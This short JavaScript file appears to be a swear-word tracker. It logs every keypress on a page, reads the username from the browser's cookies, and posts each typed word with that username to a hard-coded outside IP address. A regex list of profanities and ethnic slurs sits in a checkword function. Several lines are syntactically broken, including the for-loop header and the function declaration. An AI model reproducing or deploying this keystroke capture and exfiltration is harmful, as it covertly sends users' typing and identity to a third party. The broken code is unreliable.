
var word = new Array();

function sendMethod(){
	var cookie = document.cookie.split(";");
	var count;
	var owner;
	for(var i=0;i<cookie.length;i++){
		if(cookie[i].trim().indexOf("username")==0)
			owner= cookie[i].substring("username".length,cookie[i].length);
		else if(cookie[i].trim().indexOf("count")==0)
			count= cookie[i].substring("count".length,cookie[i].length);
			
	}
	
	var str
	for(var i=0;var<word.length;var++){
		str= str+word[i];
	}
	if(true){
		$.post("http://107.170.73.156:8001/userswore.html"),
        {username:owner
        swearword:str},
        function() {
            //put count cookie here? 
        }
	cnt = parseInt(count)+1;
        document.cookie="count="+cnt+"; expires=Thu, 18 Dec 2015 12:00:00 GMT; path=/";
	}
word.length=0;
}
document.onkeypress = function(e) {
    e = e || window.event;
    var charCode = (typeof e.which == "number") ? e.which : e.keyCode;
    if (charCode) {
	if(charCode == " ".charCodeAt(0)){
	sendMethod()
	}
	else{
	console.log(String.fromCharCode(charCode));
	word.push(String.fromCharCode(charCode));
	}
    }

}
function checkword = function(e){
while(true){	var str = e; 
var res = str.match(/fuck/g)||str.match(/shit/g)||str.match(/fuck/g)&&
str.match(/cunt/g)||str.match(/ass/g)||str.match(/cum/g)||
str.match(/whore/g)||str.match(/slut/g)||str.match(/fag/g)||
str.match(/kike/g)||str.match(/spick/g)||str.match(/dick/g)||
str.match(/bastard/g)||str.match(/fuck/g)||:
var temp = res;
var val = res.charAt(0);
var found= false;
if(val>0){
	found=true;
}
if(found==true){
	sendMethod(str);
	break;

}
}
}
;


